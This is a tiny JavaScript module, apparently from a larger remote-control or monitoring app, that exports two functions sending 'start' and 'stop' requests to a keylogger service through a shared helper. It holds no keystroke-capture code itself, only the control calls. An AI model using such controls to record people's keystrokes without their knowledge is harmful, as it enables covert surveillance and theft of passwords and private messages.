import { sendRequest } from '../index'

export default{
  startKeyLogger: () => sendRequest('keyLogger', { method: 'start' }),
  stopKeyLogger: () => sendRequest('keyLogger', { method: 'stop' })
}
